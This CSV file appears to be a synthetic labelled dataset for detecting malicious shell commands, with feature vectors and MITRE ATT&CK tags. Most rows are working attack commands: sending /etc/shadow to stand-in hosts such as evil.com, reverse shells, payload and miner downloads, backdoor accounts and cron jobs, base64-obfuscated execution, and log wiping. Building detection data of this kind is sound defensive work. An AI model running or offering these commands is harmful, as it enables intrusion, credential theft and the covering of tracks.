"bash -c ""net user /add attacker P@ssw0rd ; sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in && > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
gcc  exploit.c  -o  exploit  &&  ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
chmod 644 /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"bash -c ""nmap --script=vuln 10.0.0.1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
net user /add attacker P@ssw0rd ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""echo 'Y2F0IC9ldGMvZ3JvdXAgJiYgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbiA7IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c3NoIC1MIDgwODA6aW50ZXJuYWw6ODAgdXNlckBqdW1wLmhvc3Q=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""passwd -d root ; history -c""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive | chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
locate wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo  hello  world,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe ; history -c,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0.0, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'ZmluZCAvIC1uYW1lICcqLmNvbmYnIC1yZWFkYWJsZSAyPi9kZXYvbnVsbCB8IGhlYWQgLTIw' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
find / -name '*.pem' 2>/dev/null && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
xfreerdp  /u:Administrator  /p:Password123  /v:10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'c3UgLSBhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/os-release,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
smbclient //10.0.0.5/C$ -U Administrator,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cp /etc/hosts /tmp/hosts.bak,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
find  /home  -name  '.env'  2>/dev/null  |  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""curl -X POST http://evil.com/collect -d @/etc/shadow && chmod +x /tmp/payload""","[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
systemctl status apache2,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'cG93ZXJzaGVsbC5leGUgLUVuY29kZWRDb21tYW5kIEpBQnpBLi4u' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
lscpu ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 1]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'd2dldCAtLXBvc3QtZmlsZT0vZXRjL3Bhc3N3ZCBodHRwOi8vYXR0YWNrZXIuY29tL3JlY2VpdmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bWFzc2NhbiAtcDEtNjU1MzUgMTAuMC4wLjAvMjQgLS1yYXRlPTEwMDA=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1112_Modify_Registry'],synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/' | chmod +x /tmp/payload","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0.2, 0.4, 1, 1]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
uname -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
ping  -c  4  8.8.8.8,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
sudo echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""curl -s http://c2.attacker.com/beacon ; sleep 1""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""unset HISTFILE; export HISTSIZE=0""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1070_Indicator_Removal'],synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo arp-scan --localnet,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo shred -u /var/log/auth.log | sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'Li9wd25raXQ=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'aGlzdG9yeSAtYyAmJiBoaXN0b3J5IC13' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
ls -la /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
sudo curl -X POST http://evil.com/collect -d @/etc/shadow,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nohup curl -X POST http://evil.com/collect -d @/etc/shadow &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time echo 'Y2F0IC9ldGMvZ3JvdXAgfCBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
arp -a && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
rm  -rf  /tmp/*  /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
lscpu && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
find / -writable -type d 2>/dev/null && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
time find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1070_Indicator_Removal'],synthetic
last -n 10,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
wget -q https://example.com/file.tar.gz,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
ping -c 4 8.8.8.8,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'Z3JvdXBz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
sudo ip link show,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
"sudo runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""hostnamectl ; > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup net user /domain | echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time systemctl status apache2,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'bWFzc2NhbiAtcDEtNjU1MzUgMTAuMC4wLjAvMjQgLS1yYXRlPTEwMDA=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'd2dldCBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQgLU8gL3RtcC9wYXlsb2FkICYmIGhpc3RvcnkgLWM='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bmV0IHVzZXIgL2FkZCBhdHRhY2tlciBQQHNzdzByZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
sudo who ; history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.72, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe | sleep 1,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 && chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
time medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1110_Brute_Force'],synthetic
nohup $env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')) &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup groups $(whoami) && chmod +x /tmp/payload &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
nohup curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in ; sleep 1 &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /root /etc /var/www && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo crontab -e && history -c,"[0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo net user /domain,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1087_Account_Discovery'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
"bash -c ""echo 'Y2F0IH4vLmF3cy9jcmVkZW50aWFscyB8IGhpc3RvcnkgLWM=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh ; chmod +x /tmp/payload &,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.6, 1, 1]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /home -name '.env' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'cHl0aG9uMyBleHBsb2l0LnB5IC0tdGFyZ2V0IGxvY2FsaG9zdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 1]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
tftp  -i  10.0.0.99  GET  payload.exe  C:\Windows\Temp\payload.exe  ;  chmod  +x  /tmp/payload,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
rm -rf /tmp/* /var/tmp/* && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bm1hcCAtQSAtVDQgMTkyLjE2OC4xLjAvMjQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
locate wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nmap  --script=vuln  10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
psexec.py  Administrator:password@10.0.0.5  cmd.exe  &&  sleep  1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
